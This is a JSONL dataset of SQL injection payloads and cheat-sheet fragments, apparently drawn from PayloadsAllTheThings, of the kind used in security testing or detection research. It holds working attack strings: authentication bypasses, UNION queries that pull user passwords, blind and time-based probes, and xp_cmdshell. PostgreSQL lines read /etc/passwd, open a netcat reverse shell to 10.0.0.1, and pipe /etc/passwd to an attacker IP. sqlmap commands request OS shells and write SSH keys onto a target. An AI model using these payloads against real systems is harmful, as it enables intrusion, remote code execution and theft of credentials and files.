{"vulnerability_type": "sql_injection", "payload": "SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "COPY nc(t) TO '/tmp/nc.sh';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT current_setting('is_superuser');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "- [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "- [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* Simple characters: `'`, `\"`, `;`, `)` and `*`", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "'||'DERP", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "'+'herp", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' 'DERP", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "'%20'HERP", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "'%2B'HERP", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "page.asp?id=1' or 1=1 -- true", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| MySQL               | `conv('a',16,2)=conv('a',16,2)` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| MySQL               | `crc32('MySQL')=crc32('MySQL')` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| PostgreSQL          | `ERROR: unterminated quoted string at or near \"'\"`                                       | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| PostgreSQL          | `ERROR: syntax error at or near \"1\"`                                                     | `1'`            |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' OR '1'='1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' or 1=1 limit 1 --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| md5  | ffifdyop | `'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb`       | `'or'`    |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| md5  | 129581926211651571912466741651878684928 | `\u00daT0D\u009f\u008fo#\u00df\u00c1'or'8` | `'or'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| sha1 | 3fDf     | `Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!` | `'='`     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| sha1 | 178374   | `\u0099\u00dc\u00db\u00be}_i\u0099\u009ba!8Wm'/*\u00b4\u00d5`      | `'/*`     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c'\";", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Let's assume a vulnerable web application retrieves product details based on a product ID from a database:", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1' UNION SELECT username, password FROM users --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' AND SLEEP(5)/*", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' AND '1'='1' AND SLEEP(5)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' ; WAITFOR DELAY '00:00:05' --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Let's see a basic example to recover the version of the database using a time based sql injection.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1; EXEC xp_cmdshell('whoami') --", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "username=\"anything' UNION SELECT Username, Password FROM Users;--\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "By defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com\" --data \"username=admin&password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com/?id=1\"  -p id --sql-shell", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-shell", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-pwn", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -u \"http://www.target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\" --proxy-cred=\"user:pass\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "--proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "--proxy=\"http://user:pass@127.0.0.1:8080\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "python sqlmap.py -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "sqlmap -u \"http://targetwebsite.com/vulnerablepage.php?id=1\" --tamper=space2comment", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|escapequotes.py | Slash escape quotes (' and \") |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|percentage.py | Adds a percentage sign ('%') infront of each character  |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2comment.py | Replaces space character (' ') with comments |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2plus.py |  Replaces space character (' ') with plus ('+')  |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|varnish.py | Append a HTTP header 'X-originating-IP' |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |", "source": "PayloadsAllTheThings"}
